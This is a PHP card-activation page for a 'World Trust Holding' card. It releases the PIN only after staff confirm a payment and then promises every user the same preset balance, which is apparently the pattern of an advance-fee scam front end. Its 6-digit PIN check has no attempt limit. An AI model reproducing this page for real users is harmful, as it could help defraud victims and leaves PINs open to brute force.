<?php
/**
 * Activation PIN Entry Page
 * Accessed via email link with unique token
 */

require_once 'includes/config.php';
require_once 'includes/functions.php';
require_once 'includes/database.php';

session_start();

$error_message = '';
$success = false;
$user_data = null;
$token = sanitize_input($_GET['token'] ?? '');

// Validate token and get user data
if (empty($token)) {
    $error_message = 'Invalid activation link. Please use the link provided in your email.';
} else {
    // Get user data from token
    $pdo = get_db_connection();
    if ($pdo) {
        $stmt = $pdo->prepare("
            SELECT id, first_name, last_name, email, activation_pin, status, created_at 
            FROM activation_requests 
            WHERE activation_token = ? AND status != 'activated'
        ");
        $stmt->execute([$token]);
        $user_data = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$user_data) {
            $error_message = 'This activation link is invalid or has already been used. Please contact support if you need assistance.';
        } elseif (empty($user_data['activation_pin'])) {
            $error_message = 'Your activation PIN has not been generated yet. Please wait for our team to process your payment confirmation.';
        }
    } else {
        $error_message = 'Database connection error. Please try again later.';
    }
}

// Handle PIN submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit_pin']) && $user_data && $pdo) {
    $entered_pin = sanitize_input($_POST['activation_pin']);
    
    // Validate PIN format
    if (!preg_match('/^\d{6}$/', $entered_pin)) {
        $error_message = 'Please enter a valid 6-digit PIN.';
    } elseif ($entered_pin !== $user_data['activation_pin']) {
        $error_message = 'Incorrect activation PIN. Please check your email and try again.';
    } else {
        // PIN is correct - activate the card
        $stmt = $pdo->prepare("
            UPDATE activation_requests 
            SET status = 'activated', 
                activated_at = NOW()
            WHERE id = ?
        ");
        $stmt->execute([$user_data['id']]);
        
        $success = true;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Activation - <?php echo APP_NAME; ?></title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <!-- Header -->
        <header class="header">
            <h1 class="logo"><?php echo APP_NAME; ?></h1>
            <p class="tagline"><?php echo APP_TAGLINE; ?></p>
        </header>

        <?php if ($success): ?>
            <!-- Success Message -->
            <div class="activation-success-container">
                <div class="success-icon">✓</div>
                <h2 class="success-title">Card Successfully Activated!</h2>
                <p class="success-subtitle">Your World Trust Holding card is now active and ready to use</p>
                
                <div class="success-details">
                    <div class="info-box">
                        <div class="info-item">
                            <span class="info-label">Cardholder:</span>
                            <span class="info-value"><?php echo htmlspecialchars($user_data['first_name'] . ' ' . $user_data['last_name']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Email:</span>
                            <span class="info-value"><?php echo htmlspecialchars($user_data['email']); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Activation Date:</span>
                            <span class="info-value"><?php echo date('F j, Y \a\t g:i A'); ?></span>
                        </div>
                        <div class="info-item">
                            <span class="info-label">Status:</span>
                            <span class="info-value" style="color: var(--success-green); font-weight: bold;">ACTIVATED</span>
                        </div>
                    </div>
                    
                    <div class="alert-box" style="background: #d4edda; border-color: var(--success-green); margin-top: 20px;">
                        <h3 style="color: #155724; margin-bottom: 10px; font-size: 16px;">🎉 What's Next?</h3>
                        <ul style="color: #155724; font-size: 14px; line-height: 1.8; margin: 10px 0; padding-left: 20px;">
                            <li>Your card is now active and ready to use</li>
                            <li>You can access your balance of <strong>$<?php echo number_format(DEFAULT_BALANCE, 2); ?></strong></li>
                            <li>Check your email for further instructions on accessing your account</li>
                            <li>Keep this email for your records</li>
                        </ul>
                    </div>
                </div>
            </div>
            
        <?php elseif ($user_data && empty($error_message)): ?>
            <!-- PIN Entry Form -->
            <div class="activation-pin-entry-container">
                <div class="icon-container">
                    <div class="info-icon">🔑</div>
                </div>
                
                <h2 class="form-title">Enter Your Activation PIN</h2>
                <p class="form-subtitle">Please enter the 6-digit PIN sent to your email</p>
                
                <div class="info-box" style="margin-bottom: 25px;">
                    <div class="info-item">
                        <span class="info-label">Cardholder:</span>
                        <span class="info-value"><?php echo htmlspecialchars($user_data['first_name'] . ' ' . $user_data['last_name']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Email:</span>
                        <span class="info-value"><?php echo htmlspecialchars($user_data['email']); ?></span>
                    </div>
                    <div class="info-item">
                        <span class="info-label">Application Date:</span>
                        <span class="info-value"><?php echo date('M j, Y', strtotime($user_data['created_at'])); ?></span>
                    </div>
                </div>
                
                <form method="POST" action="" class="pin-entry-form">
                    <div class="form-group">
                        <label for="activation_pin">Activation PIN <span class="required">*</span></label>
                        <div class="pin-input-wrapper">
                            <input type="text" 
                                   id="activation_pin" 
                                   name="activation_pin" 
                                   class="pin-input"
                                   maxlength="6" 
                                   placeholder="Enter 6-digit PIN" 
                                   pattern="\d{6}"
                                   inputmode="numeric"
                                   required 
                                   autofocus>
                            <button type="button" class="toggle-pin" onclick="togglePinVisibility()">👁️</button>
                        </div>
                        <p class="help-text">Enter the 6-digit PIN from your email</p>
                    </div>
                    
                    <?php if ($error_message): ?>
                        <div class="error-message show" style="margin-bottom: 20px;">
                            ❌ <?php echo $error_message; ?>
                        </div>
                    <?php endif; ?>
                    
                    <button type="submit" name="submit_pin" class="btn btn-primary">
                        Activate Card
                    </button>
                </form>
                
                <div class="help-section">
                    <h3 class="section-title">Need Help?</h3>
                    <div class="alert-box">
                        <ul style="color: #856404; font-size: 13px; line-height: 1.8; margin: 0; padding-left: 20px;">
                            <li>Check your email inbox and spam folder for the activation PIN</li>
                            <li>The PIN is exactly 6 digits (numbers only)</li>
                            <li>If you haven't received your PIN, please wait a few more minutes</li>
                            <li>Contact our support team if you continue to experience issues</li>
                        </ul>
                    </div>
                </div>
            </div>
            
        <?php else: ?>
            <!-- Error State -->
            <div class="activation-error-container">
                <div class="error-icon">❌</div>
                <h2 class="error-title">Activation Link Issue</h2>
                <p class="error-subtitle"><?php echo $error_message; ?></p>
                
                <div class="alert-box" style="margin-top: 20px;">
                    <h3 style="color: #856404; margin-bottom: 10px; font-size: 14px;">What to do next:</h3>
                    <ul style="color: #856404; font-size: 13px; line-height: 1.8; margin: 0; padding-left: 20px;">
                        <li>Check that you're using the complete link from your email</li>
                        <li>Make sure you haven't already activated your card</li>
                        <li>Contact our support team with your application reference number</li>
                    </ul>
                </div>
            </div>
        <?php endif; ?>
        
        <!-- Footer Disclaimer -->
        <div class="disclaimer">
            <div class="disclaimer-title">Security Notice</div>
            <p>This is a secure activation page. Never share your activation PIN with anyone. World Trust Holding will never ask for your PIN via phone or email.</p>
        </div>
    </div>
    
    <script>
        function togglePinVisibility() {
            const input = document.getElementById('activation_pin');
            const button = event.currentTarget;
            
            if (input.type === 'text') {
                input.type = 'password';
                button.textContent = '👁️';
            } else {
                input.type = 'text';
                button.textContent = '🙈';
            }
        }
        
        // Auto-format PIN input (only numbers)
        document.addEventListener('DOMContentLoaded', function() {
            const pinInput = document.getElementById('activation_pin');
            if (pinInput) {
                pinInput.addEventListener('input', function(e) {
                    this.value = this.value.replace(/\D/g, '');
                });
            }
        });
    </script>
</body>
</html>
